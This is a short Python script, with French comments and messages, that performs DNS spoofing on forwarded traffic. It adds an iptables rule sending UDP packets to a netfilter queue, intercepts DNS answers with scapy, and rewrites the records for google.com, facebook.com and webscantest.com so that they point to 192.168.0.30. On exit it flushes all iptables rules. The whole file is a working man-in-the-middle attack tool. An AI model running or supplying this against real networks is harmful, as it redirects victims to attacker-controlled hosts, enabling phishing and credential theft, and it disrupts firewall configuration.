from netfilterqueue import NetfilterQueue 
from scapy.all import * 
import sys 
import os 


dns_hosts = {
    b"www.google.com.": "192.168.0.30",
    b"google.com.": "192.168.0.30",
    b"www.facebook.com.": "192.168.0.30",
    b"www.webscantest.com.":"192.168.0.30"
}

def recup_packet(packet):

	
	paquet_scapy = IP(packet.get_payload())

	if paquet_scapy.haslayer(DNSRR):

		print("paquet initial: ", paquet_scapy.summary())

		spoof_packet = modify_packet(paquet_scapy)
		print ("paquet modifier: ", spoof_packet.summary())
		packet.set_payload(bytes(spoof_packet))

	packet.accept()
	

def modify_packet(packet):

	qname = packet[DNSQR].qname
	print("nom de domaine: ",qname)

	if qname in dns_hosts :
		print("nous allons attribuer une nouvelle ip a ce nom de domaine: ", qname)
		packet[DNS].an =DNSRR(rrname=qname, rdata=dns_hosts[qname])
		packet[DNS].ancount = 1 

		del packet[IP].len
		del packet[IP].chksum
		del packet[UDP].len
		del packet[UDP].chksum


		return packet
	else : 
		return packet


	
os.system("iptables -I FORWARD -p udp -j NFQUEUE --queue-num 1")
nfqueue = NetfilterQueue()
try:
	nfqueue.bind(1, recup_packet)
	nfqueue.run()

except KeyboardInterrupt: 
	os.system("iptables --flush")

